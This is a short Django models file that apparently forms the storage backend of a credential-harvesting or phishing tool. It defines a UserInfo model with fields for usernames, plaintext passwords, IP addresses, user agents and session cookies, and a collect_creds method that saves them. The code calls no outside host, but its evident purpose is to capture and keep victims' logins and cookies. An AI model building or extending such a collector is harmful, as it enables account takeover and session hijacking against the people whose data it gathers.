from django.db import models

# Create your models here.

class UserInfo(models.Model):
    user_name     = models.CharField(max_length=100)
    user_password = models.CharField(max_length=100)
    user_ip       = models.GenericIPAddressField(default="ip")
    user_agent    = models.CharField(max_length=500, default='useragent')
    cookies       = models.TextField(max_length=100000, default='cookies')
    def collect_creds(self, user_name, password, user_agent, user_ip, cookies):
        obj = UserInfo()
        obj.user_name     = user_name
        obj.user_password = password
        obj.user_agent    = user_agent
        obj.user_ip       = user_ip
        obj.cookies       = cookies
        obj.save()
